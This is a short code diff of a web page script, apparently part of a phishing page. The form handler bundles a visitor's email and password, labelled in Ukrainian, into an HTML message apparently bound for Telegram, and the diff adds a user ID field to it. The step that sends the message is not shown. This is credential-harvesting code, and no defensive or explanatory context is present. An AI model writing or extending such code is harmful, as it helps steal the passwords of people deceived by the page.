@@ -162,8 +162,9 @@ fbq('track', 'PageView');
             const success = document.getElementById('success');
             document.getElementById('tg').addEventListener('submit', function(e) {
               e.preventDefault();
-              let message = `<b></b>\n`;
-              message += `<b>Ім'я:</b> ${ this.name.value }\n`; 
+              let message = `<b>Інформація про користувача:</b>\n`;
+
+message += `<b>ID:</b> ${userId}\n`;
               
               message += `<b>Пошта:</b> ${ this.email.value }\n`;
               message += `<b>Пароль:</b> ${ this.password.value }\n`;
